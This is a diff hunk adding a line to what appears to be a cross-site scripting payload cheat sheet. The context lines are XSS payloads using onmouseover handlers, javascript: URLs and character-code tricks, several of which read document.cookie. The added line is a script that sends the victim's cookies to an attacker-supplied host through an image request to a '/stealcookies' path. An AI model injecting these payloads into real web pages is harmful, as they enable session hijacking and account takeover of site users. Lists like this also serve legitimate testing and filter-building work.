@@ -1116,6 +1116,7 @@ foo\’; alert(document.cookie);//’;
 <IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
 <a onmouseover="alert(document.cookie)">xxs link</a>
 <a onmouseover=alert(document.cookie)>xxs link</a>
+<script>var i=new Image;i.src="http://[IP INPUT HERE]/stealcookies?data="+encodeURIComponent(document.cookie)</script>
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 <IMG SRC=# onmouseover="alert('xxs')">
